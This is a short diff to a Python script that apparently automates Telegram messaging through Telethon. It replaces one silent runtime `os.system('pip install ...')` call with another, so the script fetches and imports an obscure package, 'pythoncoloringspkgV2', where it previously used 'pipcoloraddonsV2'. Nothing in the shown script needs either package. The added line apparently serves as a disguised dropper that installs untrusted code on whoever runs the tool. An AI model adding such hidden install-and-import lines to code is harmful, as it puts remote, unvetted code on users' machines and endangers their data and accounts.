@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcoloraddonsV2")
-import pipcoloraddonsV2
+os.system("pip install pythoncoloringspkgV2")
+import pythoncoloringspkgV2
 from telethon.sync import TelegramClient
 from telethon.tl.types import InputPeerChannel
 from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
